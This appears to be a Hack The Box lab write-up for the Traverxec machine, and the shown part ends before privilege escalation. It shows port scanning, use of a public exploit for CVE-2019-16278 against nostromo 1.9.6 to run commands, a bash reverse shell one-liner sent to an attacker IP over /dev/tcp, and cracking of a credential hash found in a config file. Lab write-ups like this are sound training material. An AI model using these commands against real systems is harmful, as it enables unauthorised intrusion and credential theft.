![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/6bd1fabe-e487-4657-90a4-a896dae1d1e7)

https://app.hackthebox.com/machines/Traverxec

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I started the enumeration using quick rust scan to check for open ports & services:

```bash
sudo rustscan -a 10.10.10.165 -- -sC -sV -vv -oN traver_nmap
```

```Rust
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVWo6eEhBKO19Owd6sVIAFVCJjQqSL4g16oI/DoFwUo+ubJyyIeTRagQNE91YdCrENXF2qBs2yFj2fqfRZy9iqGB09VOZt6i8oalpbmFwkBDtCdHoIAZbaZFKAl+m1UBell2v0xUhAy37Wl9BjoUU3EQBVF5QJNQqvb/mSqHsi5TAJcMtCpWKA4So3pwZcTatSu5x/RYdKzzo9fWSS6hjO4/hdJ4BM6eyKQxa29vl/ea1PvcHPY5EDTRX5RtraV9HAT7w2zIZH5W6i3BQvMGEckrrvVTZ6Ge3Gjx00ORLBdoVyqQeXQzIJ/vuDuJOH2G6E/AHDsw3n5yFNMKeCvNNL
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
|   256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
80/tcp open  http    syn-ack ttl 63 nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After the scan completed I found only 2 open ports 22 & 80. I also, noticed that the web server is running "nostrormo 1.9.6".

I checked in searchsploit database if there is any exploit available for this version & I found 3:

```bash
searchsploit nostrormo
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f5d6e281-0d88-4215-9b8d-82209ced2dc6)

## Initial access:

After checking the results of serachsploit I observed that only 2 are showing the relevant version & from these 2 only 1 is having python exploit as other one is showing the metasploit exploit.
To not use the metasploit, I downloaded the python exploit & made some changes in the scirpt as it was showing error while running.

After making the necessary changes, I executed the script & observed the results:

```bash
python cve-2019-16278.py 10.10.10.165 80 'cat /etc/passwd'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a24e9815-044f-402b-b87b-7e3d7e90c107)

In the /etc/passwd file I observed 1 user "david".

Moving further to get a reverse shell, I used bash one-liner & executed it using the python script. After the execution I quickly received the reverse shell in my netcat listener. 🙂

```bash
python cve-2019-16278.py 10.10.10.165 80 'bash -c "bash -i >& /dev/tcp/10.10.14.128/53 0>&1"'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3b02ff8a-35ab-4d78-b109-108963928749)

## User access:

Now, I got the initial access as user "www-data" but I still don't have the user flag or sufficient access to read david's file.
To gain access as david, I started looking for manually & in one of the directory "/var/nostromo/conf" I found hashed credential belongs to david.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e1ff9641-baee-4355-91e9-7b302ca5dfb2)

I cracked this hash & gained the cleartext password from it:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9393b618-85b9-4d42-ab73-9fe7db127132)

Using this password I tried to switch to David from www-data & also tried to login via SSH but none of them worked. 😕




